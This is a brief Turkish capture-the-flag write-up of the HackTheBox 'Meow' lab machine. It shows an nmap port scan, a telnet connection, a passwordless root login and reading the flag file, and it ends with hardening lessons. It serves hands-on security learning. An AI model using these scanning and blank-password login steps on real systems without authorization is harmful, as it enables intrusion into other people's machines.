---
title: "HackTheBox — Meow (Starting Point)"
date: 2024-02-15
tags: ["HackTheBox", "Starting Point", "Telnet", "Linux"]
categories: ["Write-up"]
description: "HackTheBox Starting Point serisinin ilk makinesi — Meow cozumu"
---

**Zorluk:** Very Easy  
**OS:** Linux  
**Kategori:** Starting Point  

## Bilgi Toplama

Hedef makineyi kesfetmek icin once Nmap ile port taramasi yapiyoruz:

```bash
nmap -sV -sC -p- 10.129.x.x
```

Cikti:
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

Sadece 23. port (Telnet) acik.

## Erisiim

Telnet protokolu sifresiz veya zayif sifrelere karsi savunmasiz olabilir. Deneyelim:

```bash
telnet 10.129.x.x
```

`root` kullanicisi ile sifresiz giris deniyoruz ve basarili oluyoruz!

```
Trying 10.129.x.x...
Connected to 10.129.x.x.
login: root
```

## Flag

```bash
cat /root/flag.txt
```

## Ogrenilenler

- Telnet guvenli bir protokol degildir, SSH ile degistirilmelidir
- Varsayilan/bos sifre kontrolleri her zaman yapilmalidir
- Starting Point makineleri temel protokol bilgisini pekistirmek icin idealdir

## Araclar

- `nmap` — Port taramasi
- `telnet` — Hedef servise baglanti
